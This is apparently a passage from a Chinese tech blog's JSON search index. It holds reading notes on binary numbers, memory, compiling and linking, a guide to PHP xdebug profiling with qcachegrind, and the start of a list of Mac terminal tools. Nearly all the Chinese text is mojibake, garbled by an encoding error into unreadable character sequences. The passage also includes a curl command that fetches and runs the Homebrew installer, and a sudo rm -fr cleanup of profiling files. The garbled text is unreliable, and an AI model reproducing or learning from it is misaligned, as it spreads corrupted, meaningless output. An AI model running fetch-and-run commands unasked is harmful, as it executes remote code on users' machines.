ä»ä¸­é—´æˆªæ–­æˆ–è€…å››èˆäº”å…¥ã€‚ å° æ•° ç‚¹ å 4 ä½ ç”¨ äºŒ è¿› åˆ¶ æ•° è¡¨ ç¤º æ—¶ çš„ æ•° å€¼ èŒƒ å›´ ä¸º 0.0000~0.1111ã€‚å› æ­¤ï¼Œè¿™é‡Œåªèƒ½è¡¨ç¤º 0.5ã€0.25ã€0.125ã€0.0625 è¿™å››ä¸ª äºŒè¿›åˆ¶æ•°å°æ•°ç‚¹åé¢çš„ä½æƒç»„åˆè€Œæˆ(ç›¸åŠ æ€»å’Œ)çš„å°æ•°ã€‚ æ‰€ä»¥0.5 ç´¯åŠ ä¸€ç™¾æ¬¡å¯ä»¥åˆ°çš„ 50ï¼Œè€Œ0.1 ç´¯åŠ ä¸€ç™¾æ¬¡åˆ™ä¼šä¸¢å¤±ç²¾åº¦ã€‚ äºŒè¿›åˆ¶å’Œåè¿›åˆ¶åœ¨å®é™…çš„ç¨‹åºä¸­ï¼Œå¾€å¾€ä¸ä¼šç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶æ¥è¡¨ç¤ºï¼Œå› ä¸ºå¤ªé•¿äº†ï¼Œä¸€ä¸ªäºŒè¿›åˆ¶å°±éœ€è¦å…«ä½æ¥è¡¨ç¤ºã€‚ äºŒè¿›åˆ¶æ•°çš„ 4 ä½ï¼Œæ­£å¥½ç›¸å½“äºåå…­è¿›åˆ¶æ•°çš„ 1 ä½ã€‚ å†…å­˜å…¶å®ï¼Œä»ç‰©ç†ä¸Šæ¥çœ‹ï¼Œå†…å­˜çš„æ„é€ éå¸¸ç®€å•ã€‚åªè¦åœ¨ç¨‹åºä¸ŠèŠ±ä¸€äº›å¿ƒæ€ï¼Œå°±å¯ä»¥å°†å†…å­˜å˜æ¢æˆå„ç§å„æ ·çš„æ•°æ®ç»“æ„æ¥ä½¿ç”¨ã€‚ å†…å­˜å®é™…ä¸Šæ˜¯ä¸€ç§åä¸ºå†…å­˜ IC çš„ç”µå­å…ƒä»¶ã€‚ å†…å­˜ IC ä¸­æœ‰ç”µæºã€åœ°å€ä¿¡å·ã€æ•°æ®ä¿¡å·ã€æ§åˆ¶ä¿¡å·ç­‰ç”¨äºè¾“å…¥è¾“å‡ºçš„å¤§é‡å¼•è„š(IC çš„å¼•è„š)ï¼Œé€šè¿‡ä¸ºå…¶æŒ‡å®šåœ°å€(address)ï¼Œæ¥è¿›è¡Œæ•°æ®çš„è¯»å†™ã€‚ é‚£ä¹ˆï¼Œè¿™ä¸ªå†…å­˜IC ä¸­èƒ½å­˜æ”¾å¤šå°‘æ•°æ®å‘¢ï¼Ÿ æ•°æ®ä¿¡å·å¼•è„šæœ‰ D0~D7å…±å…«ä¸ªï¼Œè¡¨ç¤ºä¸€æ¬¡å¯ä»¥è¾“å…¥è¾“å‡º 8 ä½(= 1 å­—èŠ‚)çš„æ•°æ®ã€‚ åœ°å€ä¿¡å·å¼•è„šæœ‰ A0A9 å…±åä¸ªï¼Œè¡¨ç¤ºå¯ä»¥æŒ‡å®š `00000000001111111111` å…±1024 ä¸ªåœ°å€ã€‚ è€Œåœ°å€æ˜¯ç”¨æ¥è¡¨ç¤ºæ•°æ®çš„å­˜å‚¨åœºæ‰€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¾—å‡ºè¿™ Aä¸ªå†…å­˜ IC ä¸­å¯ä»¥å­˜å‚¨ 1024 ä¸ª 1 å­—èŠ‚çš„æ•°æ®ã€‚å› ä¸º 1024 = 1Kï¼Œæ‰€ä»¥æ”¹å†…å­˜IC çš„å®¹é‡æ˜¯1KBã€‚ æŒ‡é’ˆæŒ‡é’ˆä¹Ÿæ˜¯ä¸€ç§å˜é‡ï¼Œå®ƒæ‰€è¡¨ç¤ºçš„ä¸æ˜¯æ•°æ®çš„å€¼ï¼Œè€Œæ˜¯å­˜å‚¨ç€æ•°æ®çš„å†…å­˜çš„åœ°å€ã€‚ é€šè¿‡ä½¿ç”¨æŒ‡é’ˆï¼Œå°±å¯ä»¥å¯¹ä»»æ„æŒ‡å®šåœ°å€çš„æ•°æ®è¿›è¡Œè¯»å†™ã€‚ æ•°ç»„çš„å®šä¹‰ä¸­æ‰€æŒ‡å®šçš„æ•°æ®ç±»å‹ï¼Œä¹Ÿè¡¨ç¤ºä¸€æ¬¡èƒ½å¤Ÿè¯»å†™çš„å†…å­˜å¤§å°ã€‚ é«˜çº§ç¼–ç¨‹è¯­è¨€çš„æ•°ç»„åˆ™å®Œå…¨çœç•¥äº†è¿™äº›æ¦‚å¿µï¼Œç›´æ¥å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œå°±å¯ä»¥æ”¾å…¥ä»»æ„ç±»å‹çš„æ•°æ®ï¼ˆintã€floatã€doubleã€stringã€objectç­‰ï¼‰ã€‚ æŒ‡é’ˆçš„æ¦‚å¿µä¹Ÿæ˜¯ç±»ä¼¼ï¼ŒæŒ‡é’ˆçš„æ•°æ®ç±»å‹è¡¨ç¤ºä¸€æ¬¡å¯ä»¥è¯»å†™çš„é•¿åº¦ã€‚ æ ˆã€é˜Ÿåˆ—åŠç¯å½¢ç¼“å†²åŒºæ ˆçš„åŸæ„æ˜¯â€œå¹²è‰å †ç§¯å¦‚å±±â€ã€‚å¹²è‰å †ç§¯æˆå±±åï¼Œæœ€åå †çš„å¹²è‰ä¼š è¢«æœ€å…ˆæŠ½å–å‡ºæ¥ï¼ˆåè¿›å…ˆå‡ºï¼‰ã€‚ è€Œé˜Ÿåˆ—åˆ™æ˜¯å®Œå…¨ç›¸åçš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œå…ˆè¿›å…ˆå‡ºã€‚ å†…å­˜å’Œç£ç›˜ä¸è¯»å…¥å†…å­˜å°±æ— æ³•è¿è¡Œè®¡ç®—æœºä¸­ä¸»è¦çš„å­˜å‚¨éƒ¨ä»¶æ˜¯å†…å­˜å’Œç£ç›˜ã€‚ç£ç›˜ä¸­å­˜å‚¨çš„ç¨‹åºï¼Œå¿…é¡»è¦åŠ è½½åˆ°å†…å­˜åæ‰èƒ½è¿è¡Œã€‚ ä¸ºä»€ä¹ˆç¨‹åºä¸€å®šè¦åœ¨å†…å­˜ä¸­è¿è¡Œï¼Ÿ è¿™æ˜¯å› ä¸ºï¼Œè¿™æ˜¯å› ä¸ºè´Ÿè´£è§£æå’Œè¿è¡Œç¨‹åºå†…å®¹çš„CPUï¼Œéœ€è¦é€šè¿‡å†…éƒ¨ç¨‹åºè®¡æ•°å™¨æ¥æŒ‡å®šå†…å­˜åœ°å€ï¼Œç„¶åæ‰èƒ½è¯»å‡ºåœ°å€ã€‚ å³ä½¿CPU å¯ä»¥ç›´æ¥è¯»å‡ºå¹¶è¿è¡Œç£ç›˜ä¸­ä¿å­˜çš„ç¨‹åºï¼Œç”±äºç£ç›˜è¯»å–é€Ÿåº¦æ…¢ï¼Œç¨‹åºçš„è¿è¡Œé€Ÿåº¦è¿˜æ˜¯ä¼šé™ä½ã€‚ æœ¬æ–‡ä¸­çš„æ‰€æœ‰å›¾ç‰‡å‡æ¥è‡ªã€Šç¨‹åºæ˜¯å¦‚ä½•è·‘èµ·æ¥çš„ã€‹ã€‚ ç£ç›˜ç¼“å­˜åŠ é€Ÿäº†ç£ç›˜è®¿é—®é€Ÿåº¦ç£ç›˜ç¼“å­˜æŒ‡çš„æ˜¯æŠŠä»ç£ç›˜ä¸­è¯»å–çš„æ•°æ®å­˜å‚¨åˆ°å†…å­˜ä¸­çš„æ–¹å¼ã€‚ ç£ç›˜è®¿é—®æé«˜è®¿é—®é€Ÿåº¦çš„æœºåˆ¶ï¼š è™šæ‹Ÿå†…å­˜æŠŠç£ç›˜ä½œä¸ºéƒ¨åˆ†å†…å­˜æ¥ä½¿ç”¨è™šæ‹Ÿå†…å­˜æ˜¯æŠŠç£ç›˜ä½œä¸ºå‡è±¡çš„å†…å­˜æ¥ä½¿ç”¨ã€‚è¿™ä¸ç£ç›˜ç¼“å­˜æ˜¯å‡è±¡çš„ç£ç›˜ï¼ˆå®é™…æ˜¯å†…å­˜ï¼‰æ˜¯ç›¸å¯¹çš„ï¼Œè™šæ‹Ÿå†…å­˜æ˜¯å‡è±¡çš„å†…å­˜ï¼ˆå®é™…æ˜¯ç£ç›˜ï¼‰ã€‚ äº²è‡ªå°è¯•å‹ç¼©æ•°æ®æ–‡ä»¶æ˜¯å°†æ•°æ®å­˜å‚¨åœ¨ç£ç›˜ç­‰å­˜å‚¨åª’ä»‹ä¸­çš„ä¸€ç§å½¢å¼ï¼Œç¨‹åºæ–‡ä»¶ä¸­å­˜å‚¨æ•°æ®çš„å•ä½æ˜¯å­—èŠ‚ã€‚ æˆ‘ä»¬æŠŠèƒ½è¿˜åŸåˆ°å‹ç¼©å‰çŠ¶æ€çš„å‹ç¼©ç§°ä¸º å¯é€†å‹ç¼©ï¼Œæ— æ³•è¿˜åŸåˆ°å‹ ç¼©å‰çŠ¶æ€çš„å‹ç¼©ç§°ä¸º éå¯é€†å‹ç¼©ã€‚ ä»æºæ–‡ä»¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œç”¨æ¥åŠ¨æ€ç”³è¯·åˆ†é…æ•°æ®å’Œå¯¹è±¡çš„å†…å­˜åŒºåŸŸå½¢å¼ç§°ä¸ºå †ã€‚ æºä»£ç ç¼–è¯‘ =ã€‹æœ¬åœ°ä»£ç ï¼ˆæœºå™¨ä»£ç ï¼‰=ã€‹dumpï¼ˆæ¯ä¸ªå­—èŠ‚ç”¨ 2 ä½åå…­è¿›åˆ¶æ•°æ¥è¡¨ç¤ºçš„æ–¹å¼ï¼‰ ä»…é ç¼–è¯‘æ˜¯æ— æ³•å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶çš„ï¼Œç¼–è¯‘å™¨ç¼–è¯‘ä»…ä»…åªæ˜¯å¾—åˆ°äº†æœ¬åœ°æ–‡ä»¶ï¼Œä¸ºäº†å¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿˜éœ€è¦è¿›è¡Œâ€é“¾æ¥â€œå¤„ç†ã€‚ ç¼–è¯‘åœ¨Windows ä¸‹ï¼Œç¼–è¯‘åç”Ÿæˆçš„ä¸æ˜¯ EXE æ–‡ä»¶ï¼Œè€Œæ˜¯æ‰©å±•åä¸º.objçš„ç›®æ ‡æ–‡ä»¶ï¼Œåœ¨Unix ä¸‹ï¼Œç¼–è¯‘åç”Ÿæˆçš„ä¹Ÿä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œæ˜¯æ‰©å±•åä¸º.o çš„ç›®æ ‡æ–‡ä»¶ã€‚ è¿™äº›æ–‡ä»¶æ— æ³•ç›´æ¥è¿è¡Œï¼Œè¿™æ˜¯å› ä¸ºç¼–è¯‘è¿‡ç¨‹åªæ˜¯æ£€æŸ¥è¯­æ³•ï¼ˆå‡½æ•°ã€å˜é‡çš„å£°æ˜ï¼‰æ˜¯å¦æ­£ç¡®ã€‚ Mac ä¸‹ç¼–è¯‘main.cpp æ–‡ä»¶ï¼š 123$ gcc -c main.cpp$ ls main.cpp main.o é“¾æ¥æ‰¾åˆ°æ‰€è¦ç”¨åˆ°å‡½æ•°æ‰€åœ¨çš„ç›®æ ‡æ–‡ä»¶å¹¶ç»“åˆï¼Œç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„å¤„ç†å°±æ˜¯é“¾æ¥ï¼Œè¿è¡Œè¿æ¥çš„ç¨‹åºè¢«ç§°ä¸ºé“¾æ¥å™¨ã€‚ Mac ä¸‹é“¾æ¥main.o æ–‡ä»¶ï¼š 12$ gcc main.o -o main$ main.cpp main.o main ä¸¤æ­¥å¯ä»¥åˆå¹¶æˆä¸€æ­¥ï¼š 123$ gcc main.cpp$ ls main.cpp a.out æ€»ç»“ï¼š main.cppï¼šæºä»£ç æ–‡ä»¶ main.oï¼šæºä»£ç æ–‡ä»¶ç¼–è¯‘åç”Ÿæˆçš„æœ¬åœ°ä»£ç ï¼ˆæœºå™¨è¯­è¨€ï¼‰ mainï¼šå¯æ‰§è¡Œæ–‡ä»¶ a.outï¼šå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆé»˜è®¤åç§°ï¼‰ å½“ç¨‹åºåŠ è½½åˆ°å†…å­˜åï¼Œé™¤æ­¤ä¹‹å¤–è¿˜ä¼šé¢å¤–ç”Ÿæˆä¸¤ä¸ªç»„ï¼Œé‚£å°±æ˜¯å †å’Œæ ˆã€‚ æ ˆæ˜¯ç”¨æ¥å­˜å‚¨å‡½æ•°å†…éƒ¨ä¸´æ—¶ä½¿ç”¨çš„å˜é‡ï¼ˆå±€éƒ¨å˜é‡ï¼‰ï¼Œä»¥åŠå‡½æ•°è°ƒç”¨æ—¶æ‰€ç”¨çš„å‚æ•°çš„å†…å­˜åŒºåŸŸã€‚å †æ˜¯ç”¨æ¥å­˜å‚¨ç¨‹åºè¿è¡Œæ—¶çš„ä»»æ„æ•°æ®åŠå¯¹è±¡çš„å†…å­˜é¢†åŸŸã€‚ æ— è®ºæ˜¯ C è¯­è¨€è¿˜æ˜¯ C++ï¼Œå¦‚æœæ²¡æœ‰åœ¨ç¨‹åºä¸­æ˜ç¡®é‡Šæ”¾å †çš„å†…å­˜ç©ºé—´ï¼Œé‚£ä¹ˆå³ä½¿åœ¨å¤„ç†å®Œæ¯•åï¼Œè¯¥å†…å­˜ç©ºé—´ä»ä¼šä¸€ç›´æ®‹ç•™ã€‚è¿™ä¸ªç°è±¡ç§°ä¸º å†…å­˜æ³„éœ²ã€‚ ç¼–è¯‘å™¨å’Œè§£æå™¨çš„åŒºåˆ«ï¼Ÿç¼–è¯‘å™¨æ˜¯åœ¨ç¨‹åºè¿è¡Œä¹‹å‰å¯¹æ‰€æœ‰æºä»£ç è¿›è¡Œè§£é‡Šå¤„ç†ã€‚è§£æå™¨åˆ™æ˜¯åœ¨è¿è¡Œæ—¶å¯¹æºä»£ç çš„å†…å®¹ä¸€è¡Œä¸€è¡Œåœ°è¿›è¡Œè§£é‡Šå¤„ç†ã€‚ æ“ä½œç³»ç»Ÿå’Œåº”ç”¨çš„å…³ç³»æ“ä½œç³»ç»Ÿæœ¬èº«å¹¶ä¸æ˜¯å•ç‹¬çš„ç¨‹åºï¼Œè€Œæ˜¯å¤šä¸ªç¨‹åºçš„é›†åˆä½“ã€‚ åˆæœŸçš„æ“ä½œç³»ç»Ÿ = ç›‘æ§ç¨‹åº + åŸºæœ¬çš„è¾“å…¥è¾“å‡ºç¨‹åº åœ¨æ“ä½œç³»ç»Ÿè¿™ä¸ªè¿è¡Œç¯å¢ƒä¸‹ï¼Œåº”ç”¨å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¡¬ä»¶ï¼Œè€Œæ˜¯é€šè¿‡æ“ä½œç³»ç»Ÿæ¥é—´æ¥æ§åˆ¶ç¡¬ä»¶ã€‚ åº”ç”¨ç¨‹åºç»è¿‡ OS é—´æ¥åœ°æ§åˆ¶ç¡¬ä»¶ï¼š é«˜çº§è¯­è¨€çš„å¯ç§»æ¤æ€§å’Œç³»ç»Ÿè°ƒç”¨C è¯­è¨€ç­‰é«˜çº§ç¼–ç¨‹è¯­è¨€å¹¶ä¸ä¾å­˜ç‰¹å®šçš„æ“ä½œç³»ç»Ÿã€‚è¿™æ˜¯å› ä¸ºç”¨é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„åº”ç”¨åœ¨ç¼–è¯‘åï¼Œå°±è½¬æ¢æˆäº†åˆ©ç”¨ç³»ç»Ÿè°ƒç”¨çš„æœ¬åœ°ä»£ç ã€‚ é«˜çº§è¯­è¨€ç¼–å†™çš„å‡½æ•°è°ƒç”¨åœ¨ç¼–è¯‘ä¹‹åå˜æˆäº†ç³»ç»Ÿè°ƒç”¨ï¼š é€šè¿‡æ±‡ç¼–è¯­è¨€äº†è§£ç¨‹åºçš„å®é™…æ„æˆå‰é¢çš„ç« èŠ‚å·²ç»å¤šæ¬¡æåˆ°äº†ï¼Œè®¡ç®—æœºCPU èƒ½ç›´æ¥è§£é‡Šè¿è¡Œçš„åªæœ‰æœ¬åœ°ä»£ç ï¼ˆæœºå™¨è¯­è¨€ï¼‰ç¨‹åºã€‚ ç”¨C è¯­è¨€ç­‰é«˜çº§ç¼–ç¨‹è¯­è¨€ç¼–å†™çš„æºä»£ç ï¼Œéœ€è¦é€šè¿‡å„è‡ªçš„ç¼–è¯‘å™¨ç¼–è¯‘åï¼Œè½¬æ¢æˆæœ¬åœ°ä»£ç ã€‚ é€šè¿‡è°ƒæŸ¥æœ¬åœ°ä»£ç çš„å†…å®¹ï¼Œå¯ä»¥äº†è§£ç¨‹åºæœ€ç»ˆæ˜¯ä»¥ä½•ç§å½¢å¼æ¥è¿è¡Œçš„ã€‚ä½†æ˜¯ï¼Œå¦‚æœç›´æ¥æ‰“å¼€æœ¬åœ°ä»£ç æ¥çœ‹çš„è¯ï¼Œåªèƒ½çœ‹åˆ°æ•°å€¼çš„ç½—åˆ—ã€‚ å¦‚æœç›´æ¥ä½¿ç”¨è¿™äº›æ•°å€¼æ¥ç¼–å†™ç¨‹åºçš„è¯ï¼Œè¿˜çœŸæ˜¯ä¸å¤ªå®¹æ˜“ç†è§£ã€‚å› è€Œ å°±äº§ç”Ÿäº†è¿™æ ·ä¸€ç§æƒ³æ³•ï¼Œé‚£å°±æ˜¯åœ¨å„æœ¬åœ°ä»£ç ä¸­ï¼Œé™„å¸¦ä¸Šè¡¨ç¤ºå…¶åŠŸèƒ½çš„è‹±è¯­å•è¯ç¼©å†™ã€‚ ä¾‹å¦‚ï¼Œåœ¨åŠ æ³•è¿ç®—çš„æœ¬åœ°ä»£ç ä¸­åŠ ä¸Š add(addition çš„ç¼©å†™)ã€åœ¨æ¯”è¾ƒè¿ç®—çš„æœ¬åœ°ä»£ç ä¸­åŠ ä¸Š cmp(compare çš„ç¼©å†™)ç­‰ã€‚è¿™äº›ç¼©å†™ç§°ä¸º åŠ©è®°ç¬¦ï¼Œä½¿ç”¨åŠ©è®°ç¬¦çš„ç¼–ç¨‹è¯­è¨€ç§°ä¸º æ±‡ç¼–è¯­è¨€ã€‚ ä¸è¿‡ï¼Œå³ä½¿æ˜¯ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™çš„æºä»£ç ï¼Œæœ€ç»ˆä¹Ÿå¿…é¡»è½¬æ¢æˆæœ¬åœ°ä»£ç æ‰èƒ½è¿è¡Œã€‚è´Ÿè´£è½¬æ¢å·¥ä½œçš„ç¨‹åºç§°ä¸ºæ±‡ç¼–å™¨ï¼Œè½¬æ¢è¿™ä¸€å¤„ç†æœ¬èº«ç§°ä¸ºæ±‡ç¼–ã€‚ ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™çš„æºä»£ç ï¼Œå’Œæœ¬åœ°ä»£ç æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚å› è€Œï¼Œæœ¬åœ°ä»£ç ä¹Ÿå¯ä»¥åè¿‡æ¥è½¬æ¢æˆæ±‡ç¼–è¯­è¨€çš„æºä»£ç ã€‚æŒæœ‰è¯¥åŠŸèƒ½çš„é€†å˜æ¢ç¨‹åºç§°ä¸º åæ±‡ç¼–ç¨‹åºï¼Œé€†å˜æ¢è¿™ä¸€å¤„ç†æœ¬èº«ç§°ä¸ºåæ±‡ç¼–ã€‚","categories":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"è¯»ä¹¦ç¬”è®°","slug":"è¯»ä¹¦ç¬”è®°","permalink":"https://www.0x2beace.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP + xdebug åˆ†æä»£ç æ€§èƒ½ç“¶é¢ˆ","slug":"php-analysis-code-performance-bottleneck","date":"2021-01-19T12:12:54.000Z","updated":"2021-01-19T12:16:37.417Z","comments":true,"path":"php-analysis-code-performance-bottleneck/","link":"","permalink":"https://www.0x2beace.com/php-analysis-code-performance-bottleneck/","excerpt":"é€šå¸¸å¯ç”¨äº†xdebugæ’ä»¶ï¼Œæ€§èƒ½æµ‹è¯•è¾“å‡ºæ–‡ä»¶ä¼šä¼´éšç”Ÿæˆï¼Œé€šå¸¸æ˜¯ä»¥cachegrind.out.xxxx æ–‡ä»¶å­˜åœ¨ã€‚","text":"é€šå¸¸å¯ç”¨äº†xdebugæ’ä»¶ï¼Œæ€§èƒ½æµ‹è¯•è¾“å‡ºæ–‡ä»¶ä¼šä¼´éšç”Ÿæˆï¼Œé€šå¸¸æ˜¯ä»¥cachegrind.out.xxxx æ–‡ä»¶å­˜åœ¨ã€‚ è¯¥æ–‡ä»¶å¯ä»¥é€šè¿‡ç¬¬ä¸‰æ–¹å·¥å…·æ¥è¿›è¡Œä»£ç æ€§èƒ½åˆ†æã€‚ ä½†å¦‚æœæœ¬åœ°æœ‰å¤šä¸ªé¡¹ç›®/ç½‘ç«™ï¼Œæ‰€æœ‰çš„profile éƒ½è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­äº†ï¼Œè¿™æ ·å¹¶ä¸æ–¹ä¾¿åé¢è¿›è¡Œæ€§èƒ½åˆ†æã€‚ è‡ªå®šä¹‰profile æ–‡ä»¶åç§°å¯ä»¥é€šè¿‡é…ç½®xdebug.profiler_output_name å‚æ•°æ¥è®¾ç½®è¾“å‡ºæ–‡ä»¶åç§°ï¼Œéƒ¨åˆ†å‚æ•°å¦‚ä¸‹ï¼š ç¬¦å· å«ä¹‰ é…ç½®æ ·ä¾‹ æ ·ä¾‹æ–‡ä»¶å %c å½“å‰å·¥ä½œç›®å½•çš„crc32æ ¡éªŒå€¼ cachegrind.out.%c cachegrind.out.1258863198 %p å½“å‰æœåŠ¡å™¨è¿›ç¨‹çš„pid cachegrind.out.%p cachegrind.out.9685 %r éšæœºæ•° cachegrind.out.%r cachegrind.out.072db0 %s è„šæœ¬æ–‡ä»¶å(æ³¨) cachegrind.out.%s cachegrind.out._home_httpd_html_test_xdebug_test_php %t Unixæ—¶é—´æˆ³ï¼ˆç§’ï¼‰ cachegrind.out.%t cachegrind.out.1179434742 %u Unixæ—¶é—´æˆ³ï¼ˆå¾®ç§’ï¼‰ cachegrind.out.%u cachegrind.out.1179434749_642382 %H $_SERVER[â€˜HTTP_HOSTâ€™] cachegrind.out.%H cachegrind.out.localhost %R $_SERVER[â€˜REQUEST_URIâ€™] cachegrind.out.%R cachegrind.out._test_xdebug_test_php_var=1_var2 %S session_id (æ¥è‡ª$_COOKIE å¦‚æœè®¾ç½®äº†çš„è¯) cachegrind.out.%S cachegrind.out.c70c1ec2375af58f74b390bbdd2a679d %% %å­—ç¬¦ cachegrind.out.%% cachegrind.out.%% ç¼–è¾‘php.ini é…ç½®æ–‡ä»¶ï¼š 1xdebug.profiler_output_name &#x3D; cachegrind.out.%H ç„¶åé‡å¯ php serverã€‚ åœ¨Mac ä¸‹ï¼Œprofile æ–‡ä»¶å­˜æ”¾äº/var/tmp/ç›®å½•ä¸­ã€‚ æ€§èƒ½åˆ†æåœ¨Mac ä¸‹ï¼Œæœ‰MacCallGrind å’Œ qcachegrind å¯ä»¥ä½¿ç”¨ï¼Œä¸è¿‡å‰è€…æ˜¯æ”¶è´¹ï¼Œç›´æ¥é€šè¿‡Apple Storeä¸‹è½½ï¼Œåè€…æ˜¯å…è´¹ã€‚éœ€è¦æ‰‹åŠ¨å®‰è£…ã€‚ å®‰è£…graphvizï¼Œç”¨æ¥Call GraphåŠŸèƒ½ï¼š 1$ brew install graphviz å®‰è£… qcachegrindï¼š 1$ brew install qcachegrind å®‰è£…å®Œæˆä¹‹åï¼Œå°±å¯ä»¥æ‰“å¼€ qcachegrind åº”ç”¨äº†ï¼Œå›¾å½¢ç•Œé¢å¦‚ä¸‹ï¼š å…¶ä»–ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œå¼€å¯äº†profileæ–‡ä»¶è¾“å‡ºä¹‹åï¼Œå¦‚æœæœ¬åœ°é¡¹ç›®å¤šçš„è¯ï¼Œå¾ˆå®¹æ˜“å ç”¨ç£ç›˜å¤§é¢ç§¯ç©ºé—´ï¼Œä¸‹å›¾æ˜¯æˆ‘åŠå¹´å·¦å³æ²¡æœ‰æ¸…ç†çš„çŠ¶æ€ï¼š å¯ä»¥ä½¿ç”¨å‘½ä»¤è¿›è¡Œæ¸…ç†ï¼š 1$ sudo rm -fr &#x2F;private&#x2F;var&#x2F;tmp&#x2F;cachegrind.out.* å‚è€ƒé“¾æ¥ ä½¿ç”¨xdebugå¯¹phpè¿›è¡Œprofileçš„è¾“å‡º php+xdebug+qcachegrind(mac)æ€§èƒ½åˆ†æ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"Mac ä¸‹æœ‰å“ªäº›å¥½ç”¨çš„ç»ˆç«¯å·¥å…·","slug":"what-are-some-useful-terminal-tools-under-Mac","date":"2021-01-12T14:33:12.000Z","updated":"2021-04-03T09:42:07.392Z","comments":true,"path":"what-are-some-useful-terminal-tools-under-Mac/","link":"","permalink":"https://www.0x2beace.com/what-are-some-useful-terminal-tools-under-Mac/","excerpt":"è¿™ç¯‡ç¬”è®°ä¸»è¦æ˜¯ç”¨æ¥æ•´ç†è‡ªå·±ä¸€ç›´åœ¨ä½¿ç”¨çš„ä¸€äº›è¾ƒä¸ºå¥½ç”¨çš„ç»ˆç«¯å·¥å…·/æ‰©å±•ã€‚","text":"è¿™ç¯‡ç¬”è®°ä¸»è¦æ˜¯ç”¨æ¥æ•´ç†è‡ªå·±ä¸€ç›´åœ¨ä½¿ç”¨çš„ä¸€äº›è¾ƒä¸ºå¥½ç”¨çš„ç»ˆç«¯å·¥å…·/æ‰©å±•ã€‚ å› ä¸ºæˆ‘ä¸ªäººçš„ç»ˆç«¯é…ç½®æ˜¯ZSH + iTerm2ï¼Œæ‰€ä»¥æœ¬æ–‡çš„éƒ¨åˆ†ZSH æ‰©å±•å¯èƒ½ä¸é€‚ç”¨äºå…¶ä»–Shellç”¨æˆ·ã€‚ brewç»å¸¸ä¸ç»ˆç«¯æ‰“äº¤é“çš„ç”¨æˆ·ï¼Œå¯¹è¿™ä¸ªä¸€å®šä¸é™Œç”Ÿï¼Œå®ƒå°±æ˜¯ç±»ä¼¼Ubuntuä¸‹çš„apt-getè¿™æ ·çš„åŒ…ç®¡ç†å·¥å…·ã€‚ é€šå¸¸æˆ‘éœ€è¦æ­å»ºä¸€ä¸ªå…¨æ–°çš„å¼€å‘ç¯å¢ƒæ—¶ï¼Œå®ƒä¸€å®šæ˜¯ç¬¬ä¸€ä¸ªéœ€è¦å®‰è£…çš„å·¥å…·ã€‚ å®‰è£… brewï¼ˆbrew å®˜ç½‘ï¼‰ 1ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot; å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼šå¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š| å‘½ä»¤ | æè¿° ||â€” | â€” ||brew search package | æœç´¢è½¯ä»¶åŒ…||brew install package | å®‰è£…è½¯ä»¶åŒ…||brew uninstall package | å¸è½½è½¯ä»¶åŒ…||brew list | åˆ—å‡ºå·²å®‰è£…æ¸…å•||brew help | è·å–å¸®åŠ©| OSX æ‰©å±•osx æ‰©å±•æ˜¯zsh æä¾›çš„ä¸€ä¸ªæ§åˆ¶ç»ˆç«¯å’Œè®¿è¾¾ï¼ˆåŠŸèƒ½ä¹‹ä¸€ï¼‰çš„æ‰©å±•å·¥å…·ã€‚ å…¶ä¸­æœ€ä¸ºå¸¸ç”¨æ˜¯ofdå‘½ä»¤ï¼Œå°†å½“å‰shellçª—å£åœ¨è®¿è¾¾ä¸­æ‰“å¼€ã€‚ å¦ä¸€ä¸ªè¾ƒä¸ºå¸¸ç”¨çš„å‘½ä»¤æ˜¯cdfï¼Œå¯åœ¨shellä¸­ç›´æ¥è·³è½¬è‡³å½“å‰è®¿è¾¾çª—å£æ‰€åœ¨çš„è·¯å¾„ï¼ˆå¦‚æœå­˜åœ¨å¤šä¸ªè®¿è¾¾çª—å£ï¼Œé‚£ä¹ˆè·³è½¬è‡³æœ€å‰é¢çš„é‚£ä¸ªï¼‰ã€‚ å…¶ä»–å¸¸ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š å‘½ä»¤ æè¿° tab åœ¨å½“å‰ç›®å½•æ‰“å¼€ä¸€ä¸ªæ–°çª—å£ split_tab åœ¨å½“å‰çª—å£æ‰“å¼€ä¸€ä¸ªæ°´å¹³çª—å£ vsplit_tab åœ¨å½“å‰çª—å£æ‰“å¼€ä¸€ä¸ªå‚ç›´çª—å£ ofd åœ¨è®¿è¾¾çª—å£ä¸­æ‰“å¼€å½“å‰ç›®å½• pfd è¿”å›æœ€å‰é¢çš„è®¿è¾¾çª—å£çš„è·¯å¾„ pfs è¿”å›å½“å‰æŸ¥æ‰¾ç¨‹åºé€‰æ‹© cdf cd åˆ°å½“å‰è®¿è¾¾çª—å£æ‰€åœ¨çš„è·¯å¾„ pushdf pushed åˆ°å½“å‰è®¿è¾¾ç›®å½• quick-look å¿«é€ŸæŸ¥çœ‹æŒ‡å®šæ–‡ä»¶ man-preview 